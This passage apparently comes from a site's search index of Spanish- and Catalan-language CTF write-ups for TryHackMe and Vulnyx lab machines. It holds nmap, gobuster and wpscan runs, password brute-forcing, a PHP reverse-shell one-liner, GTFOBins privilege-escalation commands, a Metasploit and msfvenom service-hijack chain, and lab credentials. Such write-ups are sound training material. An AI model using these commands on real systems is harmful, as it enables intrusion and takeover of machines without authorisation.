identificaci\u00f3n de vulnerabilidades.</p> <ul> <li>Identificaci\u00f3n de vulnerabilidades</li> <li>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</li> <li> <p>80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu)</p> <pre><code>|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: ColddBox | One more machine\n|_http-generator: WordPress 4.1.31\n</code></pre> </li> <li> <p>4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</p> </li> <li> <p>Enumeraci\u00f3n web</p> <pre><code>whatweb 10.10.134.48\n\nhttp://10.10.134.48 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.134.48], JQuery[1.11.1], MetaGenerator[WordPress 4.1.31], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[ColddBox | One more machine], WordPress[4.1.31], x-pingback[/xmlrpc.php]\n</code></pre> <p>WordPress 4.1.31</p> <p></p> </li> </ul> <p>Hacemos fuzzing para ver si encontramos directorios :</p> <pre><code>\u276f gobuster dir -u http://10.10.134.48/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n</code></pre> <p></p> <p>En el panel /hidden enontramos posibles usuarios :</p> <p></p> <p>Users: C0ldd, Hugo, Philip</p> <p>Encontramos un WordPress:</p> <p></p> <p>Enumeramos el WordPress con WPScan:</p> <pre><code> wpscan --url http://10.10.134.48 -P /usr/share/wordlists/rockyou.txt\n\n +] URL: http://10.10.134.48/ [10.10.134.48]\n[+] Started: Mon Dec 30 16:07:22 2024\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://10.10.134.48/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://10.10.134.48/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://10.10.134.48/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).\n | Found By: Rss Generator (Passive Detection)\n |  - http://10.10.134.48/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.1.31&lt;/generator&gt;\n |  - http://10.10.134.48/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.1.31&lt;/generator&gt;\n\n[+] WordPress theme in use: twentyfifteen\n | Location: http://10.10.134.48/wp-content/themes/twentyfifteen/\n | Last Updated: 2024-11-12T00:00:00.000Z\n | Readme: http://10.10.134.48/wp-content/themes/twentyfifteen/readme.txt\n | [!] The version is out of date, the latest version is 3.9\n | Style URL: http://10.10.134.48/wp-content/themes/twentyfifteen/style.css?ver=4.1.31\n | Style Name: Twenty Fifteen\n | Style URI: https://wordpress.org/themes/twentyfifteen\n | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n |\n | Version: 1.0 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://10.10.134.48/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'\n\n[+] Enumerating All Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Config Backups (via Passive and Aggressive Methods)\n Checking Config Backups - Time: 00:00:03 &lt;==========================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:03\n\n[i] No Config Backups Found.\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:00 &lt;===========================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00\n\n[i] User(s) Identified:\n\n[+] the cold in person\n | Found By: Rss Generator (Passive Detection)\n\n[+] c0ldd\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] hugo\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] philip\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)\n\n  [+] Performing password attack on Wp Login against 4 user/s\n[SUCCESS] - c0ldd / 9876543210                    \n</code></pre> <p>Accedemos al panel con usuario c0ldd</p>"},{"location":"Writeup-ctfs/Tryhackme/ColdBox/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Explotaremos un WordPress"},{"location":"Writeup-ctfs/Tryhackme/ColdBox/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Una vez autenticados con un usuario, probaremos a editar un plugin con una revershell :</p> <p></p> <p>Editamos el tema \u201cTwenttyfifteen\u201d , el archivo 404.php, con una revershell en php.</p> <p>La ejecutamos con la ruta:  </p> <p>http://10.10.112.7/wp-content/themes/twentyfifteen/404.php</p> <p>Obtenemos la revershell</p> <p>Hacemos tratamiento de la tty</p> <pre><code>script -c bash /dev/null\ncntr+z\nstty raw -echo; fg\nreset term\nexport TERM=XTERM\nexport SHELL=BASH\n</code></pre>"},{"location":"Writeup-ctfs/Tryhackme/ColdBox/#explotacion-2","title":"Explotaci\u00f3n 2","text":""},{"location":"Writeup-ctfs/Tryhackme/ColdBox/#explotacion-3","title":"Explotaci\u00f3n 3","text":""},{"location":"Writeup-ctfs/Tryhackme/ColdBox/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/Tryhackme/ColdBox/#escalada-de-privilegios-1","title":"Escalada de privilegios 1","text":"<p>Una vez dentro, con usuario www-data buscamos binarios con SUID</p> <pre><code>find / -u=s -type f 2&gt;/dev/null\n/bin/su\n/bin/ping6\n/bin/ping\n/bin/fusermount\n/bin/umount\n/bin/mount\n/usr/bin/chsh\n/usr/bin/gpasswd\n/usr/bin/pkexec\n/usr/bin/find\n/usr/bin/sudo\n/usr/bin/newgidmap\n/usr/bin/newgrp\n/usr/bin/at\n/usr/bin/newuidmap\n/usr/bin/chfn\n/usr/bin/passwd\n/usr/lib/openssh/ssh-keysign\n/usr/lib/snapd/snap-confine\n/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/policykit-1/polkit-agent-helper-\n</code></pre> <p>Encontramos el binario \u201cfind\u201d</p> <p>Buscamos GTFObins</p> <pre><code>./find . -exec /bin/sh -p \\; -quit\n</code></pre> <p>Ejecutamos en la maquina y obtenemos root</p>"},{"location":"Writeup-ctfs/Tryhackme/ColdBox/#_1","title":"ColdBox","text":""},{"location":"Writeup-ctfs/Tryhackme/ColdBox/#escalada-de-privilegios-2","title":"Escalada de privilegios 2","text":"<p>Podemos revisar dentro del fichero wp-config.php y encontramsos credenciales para el usuario c0ldd</p> <pre><code>// ** MySQL settings - You can get this info from your web host ** //\n/** The name of the database for WordPress */\ndefine('DB_NAME', 'colddbox');\n\n/** MySQL database username */\ndefine('DB_USER', 'c0ldd');\n\n/** MySQL database password */\ndefine('DB_PASSWORD', 'cybersecurity');\n\n/** MySQL hostname */\ndefine('DB_HOST', 'localhost');\n</code></pre> <p>Usuario: c0ldd</p> <p>Password: cybersecurity</p> <p>Nos convertimos en usuario c0ldd</p> <p>Buscamos SUID con sudo -l :</p> <pre><code>sudo -l \nEl usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:\n    (root) /usr/bin/vim\n    (root) /bin/chmod\n    (root) /usr/bin/ftp\n</code></pre> <p>Buscamos con GTF Obins:</p> <p>vim</p> <pre><code>sudo vim -c ':!/bin/sh'\n</code></pre> <p>Ejecutamos en la maquina y obtenemos root</p> <p>chmo</p> <pre><code>LFILE=file_to_change \nsudo chmod 6777 $LFILE\n\nLFILE=/bin/sh\nsudo chmod 6777 $LFILE\n</code></pre> <p>ftp</p> <pre><code>sudo ftp\n!/bin/sh\n</code></pre>"},{"location":"Writeup-ctfs/Tryhackme/ColdBox/#conclusion","title":"Conclusi\u00f3n","text":"<p>\ud83d\udca1 Maquina facil que se puede escalar privilegios de diferentes maneras</p>"},{"location":"Writeup-ctfs/Tryhackme/Pickle%20Rick/","title":"Pickle Rick","text":"<p>\ud83e\udde0 Plataforma: TryHackMe</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 15 de diciembre de 2024 18:59</p> <p>\ud83c\udf10 IP: <code>10.10.21.47</code></p>"},{"location":"Writeup-ctfs/Tryhackme/Pickle%20Rick/#reconocimiento","title":"Reconocimiento","text":"<p>NMAP INICIAL </p> <pre><code>sudo nmap -p- --open -sS --min-rate 5000 -vvv -n 10.10.21.47 -oG allports\n</code></pre> <p></p> <p>NMAP Servicios </p> <pre><code> nmap -sV -script=http-enum 10.10.21.47 -vvv -oN targeted\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/Tryhackme/Pickle%20Rick/#analisis-de-vulnerabilidades","title":"An\u00e1lisis de vulnerabilidades","text":"<p>C\u00f3digo fuente</p> <p></p> <p>Username : R1ckRul3s</p> <p>Accedirm a /robots.txt</p> <p></p> <p>Accedim a /login.php i provem les credencials</p> <p></p> <p>Llistem arxius i trobem :</p> <p>Sup3rS3cretPickl3Ingred.txt</p> <p>Si provem a obrirlo amb \"CAT\" ens diu que no podem executar aquest comando. Provem amb less i amb more:</p> <p>Flag 1r ingredient :  mr. meeseek hair </p>"},{"location":"Writeup-ctfs/Tryhackme/Pickle%20Rick/#explotacion-de-vulnerabilidades","title":"Explotaci\u00f3n de vulnerabilidades","text":"<p>Intentem conectarnos amb una rever shell i la que ens funciona es una PHPexec:</p> <pre><code>php -r '$sock=fsockopen(\"10.9.4.64\",443);exec(\"bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\n</code></pre> <p></p> <p>Accedim al sistema :</p> <p>Busquem diferents fichers:</p> <p></p> <p>Entrem al home de rick i trobem el segon flag</p> <p>Flag 2n ingredient: 1 jerry tear </p>"},{"location":"Writeup-ctfs/Tryhackme/Pickle%20Rick/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Busquem com ens podem convertir en root:</p> <pre><code>sudo -l\n</code></pre> <p></p> <p>Podem executar qualsevol comando sense password</p> <pre><code>sudo /bin/bash\n</code></pre> <p>Busquem al directori root la ultima flag:</p> <p>Flag 3: fleeb juice </p>"},{"location":"Writeup-ctfs/Tryhackme/Root%20Me/","title":"Root Me","text":"<p>\ud83e\udde0 Plataforma: TryHackMe</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 4 de diciembre de 2024 21:30</p> <p>\ud83c\udf10 IP: <code>10.10.10.6</code></p> <pre><code>nmap: nmap :  map -p- -sS -sV -sC --min-rate 5000 -n -Pn 10.10.10.6 -oN namp\n</code></pre> <pre><code>gobuster: gobuster dir -u IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n</code></pre> <p>Reverse shell PHP : pentestmonkey (bypass php amb php5)</p> <pre><code>cat /var/www-data/user.txt\n</code></pre> <p>Escalada:</p> <pre><code>sudo -l\nsuid : /usr/bin/python\n</code></pre> <p>GTFObins: </p> <pre><code>./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'\n</code></pre> <pre><code>cat /root/root.txt\n</code></pre>"},{"location":"Writeup-ctfs/Tryhackme/Simple%20CTF/","title":"Simple CTF","text":"<p>Plataforma: TryHackMe OS: Linux Level: Easy Status: Done Complete: Yes Created time: 4 de diciembre de 2024 21:53 IP: 10.10.186.87</p>"},{"location":"Writeup-ctfs/Tryhackme/Simple%20CTF/#notas","title":"Notas","text":""},{"location":"Writeup-ctfs/Tryhackme/Simple%20CTF/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":""},{"location":"Writeup-ctfs/Tryhackme/Simple%20CTF/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -vvv -n -Pn &lt;%IP%&gt; -oG targeted\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/Tryhackme/Simple%20CTF/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <ul> <li>Identificaci\u00f3n de vulnerabilidades<ul> <li>21</li> <li>2222</li> <li>80</li> </ul> </li> </ul> <pre><code>sudo nmap -sCV -p1,2,3 &lt;%IP%&gt; -oN nmap\nsudo nmap -v -sV -O --script=\"safe and vuln\" -T4 -n -Pn -p135,445 -oA nmap &lt;%IP%&gt;\n</code></pre> <p></p> <p>Miramos la web y el contenido de robots.txt</p> <p></p> <p>Vemos que el directorio no esta visible Probamos con gobuster</p> <pre><code>gobuster dir -u &lt;http://10.10.186.89&gt; -w /usr/share/wordlist/seclit/Discovery/Web-Content/directory-list-2.3-mediu.txt\n\nOutput:\n\n/simple\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/Tryhackme/Simple%20CTF/#explotacion","title":"Explotaci\u00f3n","text":""},{"location":"Writeup-ctfs/Tryhackme/Simple%20CTF/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Vulnerabilidad Potencial**: CVE-2019-9053 CMS Made Simple &lt; 2.2.10 - SQL Injection</p> <ul> <li> <p>Exploit Disponibles:</p> <pre><code>searchsploit CMS Made simple 2.2.8\nOutput:\nCMS Made Simple &lt; 2.2.10 - SQL Injection | php/webapps/46635.py\n</code></pre> </li> </ul> <p>NOTA: Ejecutamos el script. Para que funcione con python3, ha que poner con () todas las declaraciones print que van con \u201c</p> <pre><code>python3 46635.py\n</code></pre> <p></p> <pre><code>+] Salt for password found: 1dac0d92e9fa6bb2\n[+] Username found: mitch\n[+] Email found: admin@admin.com\n[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96\n</code></pre>"},{"location":"Writeup-ctfs/Tryhackme/Simple%20CTF/#explotacion-2","title":"Explotaci\u00f3n 2","text":"<p>Probamos a desencriptar el hash</p> <pre><code>hashcat -m 20 -a 0 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlist/rockyou.txt\n#\n10 = md5($pass.$salt)\n20 = md5($salt.$pass)\n\nOutput :\n0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret\n</code></pre>"},{"location":"Writeup-ctfs/Tryhackme/Simple%20CTF/#explotacion-3","title":"Explotaci\u00f3n 3","text":"<p>Conectamos por ssh</p> <pre><code>ssh -p 2222 mitch@10.10.186.87\n</code></pre>"},{"location":"Writeup-ctfs/Tryhackme/Simple%20CTF/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":""},{"location":"Writeup-ctfs/Tryhackme/Simple%20CTF/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Accedemos como mitch</p> <pre><code>   sudo -l\n\n   User mitch may run the following commands on Machine:\n   (root) NOPASSWD: /usr/bin/vim\n</code></pre> <p>Buscamos el binario en GTFObins</p> <pre><code>Payload:\nsudo vim -c ':!/bin/sh'\n</code></pre> <p>Probamos a obtener la shell: </p> <p></p>"},{"location":"Writeup-ctfs/Tryhackme/Simple%20CTF/#obtencion-de-usertxt","title":"Obtenci\u00f3n de user.txt","text":"<ul> <li> <p>Localizaci\u00f3n:</p> <pre><code>find / -name \"user.txt\"\ncat /path/to/user.txt\nOutput: G00d j0b, keep up!\n</code></pre> </li> </ul>"},{"location":"Writeup-ctfs/Tryhackme/Simple%20CTF/#obtencion-de-roottxt","title":"Obtenci\u00f3n de Root.txt","text":"<ul> <li> <p>Localizaci\u00f3n:</p> <pre><code>find / -name \"root.txt\"\ncat /path/to/root.txt\nOutput: W3ll d0n3. You made it!\n</code></pre> </li> </ul>"},{"location":"Writeup-ctfs/Tryhackme/Simple%20CTF/#conclusion","title":"Conclusi\u00f3n","text":""},{"location":"Writeup-ctfs/Tryhackme/Steel%20Mountain/","title":"Steel Mountain","text":"<p>\ud83e\udde0 Plataforma: TryHackMe</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 15 de diciembre de 2024 19:06</p> <p>\ud83c\udf10 IP: <code>10.10.37.44</code></p>"},{"location":"Writeup-ctfs/Tryhackme/Steel%20Mountain/#reconocimiento-recon","title":"Reconocimiento (Recon)","text":"<ul> <li>[ ]  Nmap inicial:</li> </ul> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -vvv -n -Pn 10.10.37.44 -oG allPorts\n</code></pre> <p>Puertos Abiertos:</p> <p>80,135,139,445,3389,5985,8080,47001,49153,49155,49163,49164</p> <p></p> <ul> <li>[ ]  Nmap serveis</li> </ul> <pre><code>sudo nmap -sCV -p1,2,3 10.10.37.44 -oN nmap\nsudo nmap -v -sV -O --script=\"safe and vuln\" -T4 -n -Pn -p135,445 -oA nmap 10.10.37.44\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/Tryhackme/Steel%20Mountain/#analisis-de-vulnerabilidades","title":"An\u00e1lisis de Vulnerabilidades","text":"<p>Miramos las dos paginas web. Vemos que la web alojada en el 8080 corre:</p> <p>HttpFile Server 2.3</p> <ul> <li>Vulnerabilidad Potencial: HTTPFileServer 2.3 (CVE 2014-6287)</li> <li> <p>Exploit Disponibles:</p> <pre><code>searchsploit rejetto HTTP File Server\nHTTP File Server (HFS) Unauthenticated Remote Code Execution\n</code></pre> </li> </ul>"},{"location":"Writeup-ctfs/Tryhackme/Steel%20Mountain/#explotacion-exploit","title":"Explotaci\u00f3n (Exploit)","text":"<p>Metasploit:</p> <pre><code>msfconsole\nsearch rejetto HttpFileServer\nuse 0\nset RHOST IP\nset RPORT 8080\nset TARGETURI /\nset LHOST localIP\n</code></pre> <p>msf6 exploit(windows/http/rejetto_hfs_exec)</p> <p></p> <ul> <li>Resultados: Probamos pero da error. Cambiamos payload a : payload/windows/meterpreter/reverse_http</li> </ul> <pre><code>set PAYLOAD 73\nrun\n</code></pre> <p>Obtenemos shell meterpreter</p>"},{"location":"Writeup-ctfs/Tryhackme/Steel%20Mountain/#escalada-de-privilegios","title":"Escalada de Privilegios","text":"<p>Enumeraci\u00f3n de Privilegios: Bajamos el script de Powershell, PowerUp.ps1 para enumerar el sistema</p> <pre><code>upload PowerhShell.ps1\n</code></pre> <p></p> <ul> <li>Vulnerabilidad Encontrada: Servicio que se puede reiniciar</li> <li> <p>M\u00e9todo de Escalada: Creamos con msfvenom el payload</p> <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.8.49.154 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advance.exe\n</code></pre> </li> </ul> <p>Para subirlo a : Ruta: C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe Nombre: AdvancedSystemCareService9</p> <p>Paramos el servicio:</p> <pre><code>sc stop AdvancedSystemCareService9\n</code></pre> <p>Sobreescribimos el fichero ASCService.exe por el payload de msfvenom y renombramos</p> <p>Abrimos un handler en Metasploit para recibir la consola:</p> <pre><code>msfconsole&gt; search exploit/handler/multi\nset LHOST nuestaIP\nset LPORT 4443\nexploit -j\nsessions -i 1 'Para volver a la consola de meterpreter'\n</code></pre> <p>Reiniciamos el servicio :</p> <pre><code>sc start AdvancedSystemCareService9\n'Al momento recibimos la shell del handler'\n'Ponemos el terminal en background'\n'volvemos a msfconsole'\nsessions -i\n'seleccionamos la shell que se ha creado'\nsession -i 2\n Obtenemos la shell con permisos de System\n</code></pre>"},{"location":"Writeup-ctfs/Tryhackme/Steel%20Mountain/#post-explotacion","title":"Post-Explotaci\u00f3n","text":"<p>Obtenci\u00f3n de User.txt</p> <ul> <li>Localizaci\u00f3n:</li> </ul> <pre><code>dir root.txt /s\nDirectory of C:\\\\Users\\\\Administrator\\\\Desktop\n</code></pre> <ul> <li>Contenido:</li> </ul> <pre><code> type root.txt\n 9af5f314f57607c00fd09803a587db80\n</code></pre>"},{"location":"Writeup-ctfs/Tryhackme/Steel%20Mountain/#52-obtencion-de-roottxt","title":"5.2 Obtenci\u00f3n de Root.txt","text":"<ul> <li> <p>Localizaci\u00f3n:</p> <pre><code>dir user.txt /s\nDirectory of C:\\\\Users\\\\bill\\\\Desktop\\\\\n</code></pre> </li> <li> <p>Contenido:</p> </li> </ul> <pre><code>   type user.txt\n   b04763b6fcf51fcd7c13abc7db4fd365\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Admin/","title":"Admin","text":"<p>\ud83e\udde0 Plataforma: Vulnyx</p> <p>\ud83d\udcbb Sistema operativo: Windows</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 12 de abril de 2025 17:36</p> <p>\ud83c\udf10 IP: <code>192.168.0.99</code></p>"},{"location":"Writeup-ctfs/Vulnyx/Admin/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general   <p>Identidicamos el equipo medante un escaneo con arp-scan. Observamos que empieza por 08:00 , que corresponde al fabricante Virtual.</p> <p>Mediante el TTL determinamos que se trata de una maquina Windonws</p> <pre><code> whichSystem.py 192.168.0.99                                                                                                     \n    192.168.0.99 (ttl -&gt; 128): Windows\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Admin/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 192.168.0.99 -oG targeted\n\nPORT      STATE SERVICE      REASON\n80/tcp    open  http         syn-ack ttl 128\n135/tcp   open  msrpc        syn-ack ttl 128\n139/tcp   open  netbios-ssn  syn-ack ttl 128\n445/tcp   open  microsoft-ds syn-ack ttl 128\n5040/tcp  open  unknown      syn-ack ttl 128\n5985/tcp  open  wsman        syn-ack ttl 128\n47001/tcp open  winrm        syn-ack ttl 128\n49664/tcp open  unknown      syn-ack ttl 128\n49665/tcp open  unknown      syn-ack ttl 128\n49666/tcp open  unknown      syn-ack ttl 128\n49667/tcp open  unknown      syn-ack ttl 128\n49668/tcp open  unknown      syn-ack ttl 128\n49670/tcp open  unknown      syn-ack ttl 128\n49676/tcp open  unknown      syn-ack ttl 128\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Admin/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>sudo nmap -p80,135,139,445,5040,5985,47001,49664,49665,49666,49667,49668,49670,49676 -sCV 192.168.0.99 -oN ports\n\nPORT      STATE SERVICE       VERSION\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows\n| http-methods: \n|_  Potentially risky methods: TRACE\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n5040/tcp  open  unknown\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49668/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  msrpc         Microsoft Windows RPC\n49676/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 08:00:27:A8:48:55 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n|_clock-skew: -1s\n| smb2-time: \n|   date: 2025-04-12T15:47:31\n|_  start_date: N/A\n|_nbstat: NetBIOS name: ADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:a8:48:55 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n</code></pre> <ul> <li>Identificaci\u00f3n de vulnerabilidades<ul> <li>80/tcp    open  http          Microsoft IIS httpd 10.0</li> <li>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</li> <li>135/tcp   open  msrpc         Microsoft Windows RPC</li> <li>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</li> <li>445/tcp   open  microsoft-ds?</li> </ul> </li> </ul> <p>Mediante fuzzing, buscamos directorios o ficheros disponibles en el servidor web</p> <pre><code>gobuster dir -u http://192.168.0.99 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt \n/tasks.txt            (Status: 200) [Size: 98]\n</code></pre> <p>Encontramos el fichero tasks.txt</p> <pre><code>Pending tasks:\n\n - Finish website\n - Update OS\n - Drink coffee\n - Rest\n - Change password\n\nBy hope\n</code></pre> <p>Al tener el puerto Winrm abierto, probamos a buscar el password para este usuario</p> <p>Hay un posible usuario, por lo que procedemos a buscar la contrase\u00f1a mediante crackmapexec</p> <pre><code>crackmapexec winrm 192.168.0.99 -u \"hope\" -p /usr/share/wordlists/rockyou.txt\n\nWINRM       192.168.0.99   5985   ADMIN            [+] ADMIN\\hope:loser (Pwn3d!)\n</code></pre> <p>Enumeramos recursos con </p> <pre><code>smbmap -u \"hope\" -p \"loser\" -H 192.168.0.99\n[+] IP: 192.168.0.99:445    Name: ADMIN                 Status: Authenticated\n    Disk                                                    Permissions Comment\n    ----                                                    ----------- -------\n    ADMIN$                                              NO ACCESS   Admin remota\n    C$                                                  NO ACCESS   Recurso predeterminado\n    IPC$                                                READ ONLY   IPC remota\n</code></pre> <p>Listamos los recursos pero no vemos nada interesante.</p>"},{"location":"Writeup-ctfs/Vulnyx/Admin/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos diferentes accesos"},{"location":"Writeup-ctfs/Vulnyx/Admin/#winrm","title":"Winrm","text":"<p>Probamos la conexion mediante evil-winrm</p> <pre><code>evil-winrm -i 192.168.0.99 -u hope -p loser \n*Evil-WinRM* PS C:\\Users\\hope\\desktop&gt; dir\n\n    Directorio: C:\\Users\\hope\\desktop\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----          7/3/2024   9:42 PM             70 user.txt\n\n*Evil-WinRM* PS C:\\Users\\hope\\desktop&gt; type user.txt\naa*************************ce1\n*Evil-WinRM* PS C:\\Users\\hope\\desktop&gt; \n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Admin/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1 Accedemos con las credenciales encontradas"},{"location":"Writeup-ctfs/Vulnyx/Admin/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Ejecutamos winPEAS para enumerar el sistema:</p> <pre><code>*Evil-WinRM* PS C:\\&gt; mkdir temp\n*Evil-WinRM* PS C:\\&gt; cd temp\n*Evil-WinRM* PS C:\\temp&gt; upload winPEASx64.exe\n*Evil-WinRM* PS C:\\temp&gt;.\\winPEASx64.exe\n\n# Vemos en el historial el archivo de la cache de powershell, donde aparecen los \u00faltimos comandos ejecutados\n\n  Found Windows Files\nFile: C:\\Users\\hope\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\nFile: C:\\Users\\hope\\Documents\\file\\sam\nFile: C:\\Users\\All Users\\USOShared\\Logs\\System\nFile: C:\\Program Files\\Common Files\\System\nFile: C:\\Program Files (x86)\\Common Files\\System\nFile: C:\\Users\\Default\\NTUSER.DAT\nFile: C:\\Users\\hope\\NTUSER.DAT\n\n*Evil-WinRM* PS C:\\temp&gt; type  